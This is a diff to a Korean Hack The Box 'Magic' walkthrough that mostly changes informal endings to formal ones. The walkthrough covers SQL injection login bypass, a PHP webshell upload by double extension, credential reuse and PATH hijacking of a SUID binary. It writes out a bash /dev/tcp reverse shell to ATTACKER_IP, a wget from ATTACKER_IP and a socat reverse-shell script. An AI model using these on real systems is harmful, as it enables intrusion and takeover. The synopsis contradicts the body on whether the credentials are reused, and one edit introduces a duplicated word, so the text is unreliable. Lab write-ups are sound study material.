@@ -11,7 +11,7 @@ categories: [Linux, Medium]
 **분류:** 공식 (Official)
 
 ### 개요 (Synopsis)
-Magic은 커스텀 웹 애플리케이션을 특징으로 하는 쉬운 난이도의 Linux 머신이다. 로그인 폼의 SQL 인젝션(SQL injection) 취약점을 악용하여 로그인을 우회하고 업로드 페이지에 접근할 수 있다. 취약한 화이트리스트 검증을 통해 PHP 웹 쉘(webshell)을 업로드할 수 있으며, 이를 사용해 명령 실행 권한을 얻게 된다. MySQL 데이터베이스에서 평문 자격 증명이 발견되고, 이는 수평적 권한 이동(lateral movement)을 위해 재사용되지 않는다. 경로 하이재킹(Path hijacking) 벡터와 시스템에 부여된 SUID 권한을 결합하면 시스템을 완전히 장악할 수 있다.
+Magic은 커스텀 웹 애플리케이션을 특징으로 하는 쉬운 난이도의 Linux 머신이다. 로그인 폼의 SQL 인젝션(SQL injection) 취약점을 악용하여 로그인을 우회하고 업로드 페이지에 접근할 수 있다. 취약한 화이트리스트 검증을 통해 PHP 웹 쉘(webshell)을 업로드할 수 있으며, 이를 사용해 명령 실행 권한을 얻게 된다. MySQL 데이터베이스에서 평문 자격 증명이 발견되고, 이는 수평적 권한 이동(lateral movement)을 위해 재사용되지 않는다 않는다. 경로 하이재킹(Path hijacking) 벡터와 시스템에 부여된 SUID 권한을 결합하면 시스템을 완전히 장악할 수 있다.
 
 ### 요구 기술 (Skills Required)
 * PHP에 대한 기본 지식
@@ -55,7 +55,7 @@ Nmap 출력을 보면 이 머신은 기본 포트에서 OpenSSH와 Apache 서버
 이미지 갤러리가 보이고, 하단에 있는 Login 버튼을 클릭하면 로그인 페이지로 이동한다.
 ![alt text](/assets/images/htb/linux/medium/magic/image-1.png)
 
-하지만 `admin` / `password` 나 `admin` / `admin` 같은 흔한 자격 증명은 작동하지 않아.
+하지만 `admin` / `password` 나 `admin` / `admin` 같은 흔한 자격 증명은 작동하지 않는다.
 
 ### Gobuster
 웹 서버를 열거하여 다른 파일이나 디렉터리를 호스팅하고 있는지 확인한다.
@@ -98,7 +98,7 @@ gobuster dir -u TARGET_IP/images -w /usr/share/dirb/wordlists/common.txt -x php
 PHP 리버스 쉘 업로드를 시도해 볼 수 있지만, 웹사이트가 특정 파일 형식만 허용하기 때문에 실패하게 된다.
 ![alt text](/assets/images/htb/linux/medium/magic/image-4.png)
 
-애플리케이션 로직이 업로드되는 파일의 확장자가 jpeg, jpg 또는 png인지 확인하는 것 같다. Apache 문서에 따르면 파일은 여러 확장자를 가질 수 있고 그 순서는 보통 중요하지 않아. 여러 확장자를 가진 파일이 미디어 타입(media-type)과 핸들러(handler) 둘 다에 연결되면, 결과적으로 핸들러와 연결된 모듈이 해당 요청을 처리하게 된다.
+애플리케이션 로직이 업로드되는 파일의 확장자가 jpeg, jpg 또는 png인지 확인하는 것 같다. Apache 문서에 따르면 파일은 여러 확장자를 가질 수 있고 그 순서는 보통 중요하지 않다. 여러 확장자를 가진 파일이 미디어 타입(media-type)과 핸들러(handler) 둘 다에 연결되면, 결과적으로 핸들러와 연결된 모듈이 해당 요청을 처리하게 된다.
 
 예를 들어, `.php` 확장자는 `application/x-httpd-php` 핸들러에, `.jpg` 확장자는 `image/jpeg` 미디어 타입에 매핑되어 있는 `test.php.jpg`라는 파일이 있다고 한다. 그러면 `application/x-httpd-php` 핸들러가 사용되어 PHP 파일로 처리될 것이다.
 
@@ -163,7 +163,7 @@ http://TARGET_IP/images/uploads/webshell.php.jpg?0=whoami
 ```
 ![alt text](/assets/images/htb/linux/medium/magic/image-8.png)
 
-Netcat을 이용해 리스너를 열고 리버스 쉘을 얻어 본다. `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` 같은 간단한 bash 리버스 쉘 원라이너는 작동하지 않아. Python을 시도한다.
+Netcat을 이용해 리스너를 열고 리버스 쉘을 얻어 본다. `bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1` 같은 간단한 bash 리버스 쉘 원라이너는 작동하지 않는다. Python을 시도한다.
 
 웹 쉘에서 `which python` 명령을 입력하면 아무 결과도 없지만, `which python3`는 결과를 반환한다.
 
@@ -216,7 +216,7 @@ class Database
 <SNIP>
 ```
 
-하지만 이 비밀번호로 `theseus` 사용자로 전환하려고 시도하면 인증에 실패한다. MySQL 서버는 외부로 노출되어 있지 않고, 머신에 MySQL 클라이언트도 설치되어 있지 않아.
+하지만 이 비밀번호로 `theseus` 사용자로 전환하려고 시도하면 인증에 실패한다. MySQL 서버는 외부로 노출되어 있지 않고, 머신에 MySQL 클라이언트도 설치되어 있지 않다.
 
 ```bash
 www-data@ubuntu:/var/www/Magic$ mysql
@@ -276,7 +276,7 @@ use Magic;
 show tables;
 ```
 
-`login`이라는 단일 테이블이 발견되었어. 포함된 데이터를 살펴본다.
+`login`이라는 단일 테이블이 발견됐다. 포함된 데이터를 살펴본다.
 
 ```sql
 select * from login;
@@ -287,7 +287,7 @@ id | username | password
 1  | admin    | Th3s3usW4sK1ng
 ```
 
-`admin` 사용자의 평문 비밀번호가 드러났어. `Th3s3usW4sK1ng`라는 비밀번호를 재사용해서 `theseus` 계정으로 로그인할 수 있다.
+`admin` 사용자의 평문 비밀번호가 드러났다. `Th3s3usW4sK1ng`라는 비밀번호를 재사용해서 `theseus` 계정으로 로그인할 수 있다.
 
 ```bash
 www-data@ubuntu:/tmp$ su theseus
@@ -315,7 +315,7 @@ find / -perm -4000 -exec ls -l {} \; 2>/dev/null
 -rwsr-xr-x 1 root root  64424 Jun 28 2019 /bin/ping
 ```
 
-결과 중에 매우 흥미로운 `/bin/sysinfo` 바이너리가 있다. SUID 비트 `s`는 이 프로그램이 root 권한으로 실행된다는 것을 보장해 줘. 이 바이너리를 실행하면 권한이 낮은 사용자는 일반적으로 접근할 수 없는 시스템 정보를 반환한다.
+결과 중에 매우 흥미로운 `/bin/sysinfo` 바이너리가 있다. SUID 비트 `s`는 이 프로그램이 root 권한으로 실행된다는 것을 보장해 준다. 이 바이너리를 실행하면 권한이 낮은 사용자는 일반적으로 접근할 수 없는 시스템 정보를 반환한다.
 
 ```bash
 theseus@ubuntu:/tmp$ sysinfo
@@ -362,7 +362,7 @@ echo $PATH
 /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
 ```
 
-`/tmp` 디렉터리가 `PATH`의 맨 앞에 추가되었어. 이 공격을 계속 진행하려면 미리 컴파일된 버전의 `socat`을 업로드해야 한다.
+`/tmp` 디렉터리가 `PATH`의 맨 앞에 추가됐다. 이 공격을 계속 진행하려면 미리 컴파일된 버전의 `socat`을 업로드해야 한다.
 
 ```bash
 python -m SimpleHTTPServer 8080
@@ -375,7 +375,7 @@ wget [http://ATTACKER_IP:8080/socat](http://ATTACKER_IP:8080/socat)
 chmod +x socat
 ```
 
-`socat`을 사용해 로컬 머신으로 리버스 쉘을 보내는 간단한 bash 스크립트를 작성한다. 파일 이름을 `cat`으로 짓고 실행 가능하게 만들어.
+`socat`을 사용해 로컬 머신으로 리버스 쉘을 보내는 간단한 bash 스크립트를 작성한다. 파일 이름을 `cat`으로 짓고 실행 가능하게 만든다.
 
 ```bash
 echo "./socat tcp-connect:ATTACKER_IP:5555 exec:/bin/sh,pty,stderr,setsid,sigint,sane" > cat
